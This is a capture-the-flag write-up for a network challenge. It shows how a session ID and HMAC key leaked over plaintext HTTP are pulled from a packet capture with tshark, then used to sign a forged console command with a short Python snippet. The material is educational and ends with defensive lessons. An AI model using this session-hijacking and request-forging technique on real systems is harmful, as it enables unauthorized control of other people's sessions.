---
tags: [network, pcap, http, hmac, session-hijacking]
---

🇬🇧 English · [🇫🇷 Français](README.fr.md)

# Hard Landing

| Category | Solves | Solved | First blood | Hint used | Solved by | Challenge author |
|---|---|---|---|---|---|---|
| network | 86 | ✅ | — | no | 0xAr3s-root | Teodor Giurgica |

## Challenge description

> A flight-safety console that supports an allied air base in the Operation Dawn theatre accepted destructive commands from a workstation its administrator never used. New logins are disabled, but the exposed session is still live.
>
> Review the incident capture and access log, recover the administrator's session material, then issue the documented safe recovery command with a fresh valid signature. The live console returns the recovery code only after authenticating that command.

**Artifact files:** `files/hard-landing.zip` → `console.pcapng`, `console_access.log`, `ops_notes.txt` (not committed)
**Target:** a timed live instance (`http://w03.ctf.chronos-security.ro:PORT`, 30 min TTL)

## TL;DR

The console authenticates commands with a session-bound HMAC-SHA256, but the login step that hands out the session ID *and* the HMAC key runs over plaintext HTTP. The capture shows the administrator logging in from `192.0.2.11`; both `session` and `key` are visible in the `/api/login` response. Three destructive commands are then replayed with that same session from a different host, `192.0.2.14` — a textbook session/key theft off the wire, not a credential guess. `GET /api/status` on the live console documents the canonical string to sign and the safe recovery command (`RETURN_TO_PAD`). Signing it with the stolen key returns the flag.

## Approach

**1. Recon — triage the three files**

```bash
unzip -l hard-landing.zip
# console.pcapng         full HTTP capture of the incident window
# console_access.log     application-level audit log
# ops_notes.txt          incident handoff notes
```

`console_access.log` immediately shows the anomaly:

```
11:22:00Z LOGIN   src=192.0.2.11 role=administrator session=adm-2aca3785b702d3ef824b9cb8 result=issued
11:22:08Z COMMAND src=192.0.2.11 session=adm-2aca...                command=STATUS              result=accepted
11:23:00Z COMMAND src=192.0.2.14 session=adm-2aca...                command=DISABLE_SAFETY_LINK result=accepted
11:23:06Z COMMAND src=192.0.2.14 session=adm-2aca...                command=DIVERT_FROM_CORRIDOR result=accepted
11:23:12Z COMMAND src=192.0.2.14 session=adm-2aca...                command=SUPPRESS_RECOVERY   result=accepted
11:23:17Z AIRCRAFT_LINK_LOST src=192.0.2.20 aircraft=N17 result=recorded
```

The same admin session is used from two different IPs. `192.0.2.14` never logged in — it reused credentials that leaked somewhere else. `ops_notes.txt` confirms the console speaks plain HTTP and that commands are authenticated with a session-bound HMAC-SHA256 signature with a freshness window.

**2. Pull the leaked session + key from the pcap**

```bash
tshark -r console.pcapng -Y http -T fields \
  -e frame.number -e ip.src -e ip.dst \
  -e http.request.method -e http.request.uri -e http.file_data
```

The `/api/login` response for the administrator (sent in clear text) is:

```json
{"session":"adm-2aca3785b702d3ef824b9cb8",
 "key":"2aca3785b702d3ef824b9cb870481e04e1179b09172a1f9da3710e6bb2a759f1",
 "role":"administrator"}
```

Both the session ID and the raw HMAC key (64 lowercase hex chars = 32 bytes) are on the wire. No TLS, no secrecy — anyone on-path between `192.0.2.11` and the console at the time of login can lift them, which is exactly how `192.0.2.14` got in.

**3. Query the live console for the exact request format**

```bash
curl -s http://w03.ctf.chronos-security.ro:PORT/api/status | jq
```

```json
{
  "request": {
    "method": "POST",
    "path": "/api/command",
    "headers": ["X-Session", "X-Timestamp (Unix seconds)", "X-Signature (64 lowercase hexadecimal characters)"],
    "canonical": "POST\n/api/command\n<X-Timestamp>\n<BODY>",
    "hmac": "HMAC-SHA256; decode the login JSON's exactly 64 lowercase hexadecimal key characters to 32 bytes before use",
    "body": "{\"cmd\":\"RETURN_TO_PAD\",\"pad\":\"A1\"}"
  }
}
```

**4. Forge a freshly signed safe-recovery command**

```python
body = '{"cmd":"RETURN_TO_PAD","pad":"A1"}'
ts = str(int(time.time()))
canonical = f"POST\n/api/command\n{ts}\n{body}"
sig = hmac.new(bytes.fromhex(key_hex), canonical.encode(), hashlib.sha256).hexdigest()
# POST /api/command with X-Session, X-Timestamp, X-Signature
```

The console validates the signature and freshness window, executes `RETURN_TO_PAD`, and returns the flag in `recovery_receipt` (redacted here; see `solve/solve.py`).

## Key takeaways

- Authenticating requests with HMAC is worthless if the key itself is handed out over an unencrypted channel at login — TLS protects the *key exchange*, not just the commands.
- A hijacked session surfacing from a second, never-authenticated source IP in the access log is the giveaway: correlate `LOGIN` events to the IPs that later issue `COMMAND`s.
- `GET /api/status` acting as self-documentation for the signing scheme is a deliberate "safe recovery" path — read it before guessing request formats.
